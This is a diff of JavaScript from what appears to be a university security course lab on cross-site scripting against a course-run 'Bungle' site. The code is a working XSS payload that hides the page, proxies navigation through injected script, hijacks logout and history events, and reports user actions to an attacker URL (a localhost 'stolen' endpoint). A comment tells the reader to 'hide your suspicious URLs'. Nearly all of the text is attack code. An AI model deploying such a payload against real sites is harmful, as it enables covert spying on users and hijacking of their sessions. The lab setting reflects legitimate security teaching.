@@ -66,6 +66,9 @@ Then just add spying code and hide your suspicious URLs.
 
 // Inject this XSS payload. 
 function payload(attacker) {
+addEventListener('popstate',(event)=>{
+	proxy(event.state.page, attacker)
+});
 function proxy(href, spying_url) {
 
 $('html').hide()
@@ -96,10 +99,6 @@ function hijack() {
 		})
 	}
 
-	addEventListener('popstate',(event)=>{
-		proxy(event.state.page, attacker)
-	});
-
 	if (h){
 		h.each((i,obj)=>{
 			if (obj.href.includes('payload')) {
@@ -116,7 +115,6 @@ function hijack() {
 		lgoB.attr('type', 'button').click(() => {
 			post('logout')
 			$.get(attacker, {event:'logout'})
-			proxy('./', attacker)
 		})
 	}
 	bungLn.removeAttr('href').click(() => {
@@ -185,7 +183,7 @@ switch(defense) {
 
 // You MUST not modify anything past this line.
 var target = `http://bungle-cs461.csl.illinois.edu/`;
-var attacker = `http://127.0.0.1:31337/stolen/`;
+var attacker = `http://localhost:31337/stolen`//`http://127.0.0.1:31337/stolen/`;
 
 $(function() {
 $("#defense1").html("<a target=\"run\" href=\"" + makeLink(target, attacker, 1) + "\">Try The Warmup! 2.2.3.1</a>");
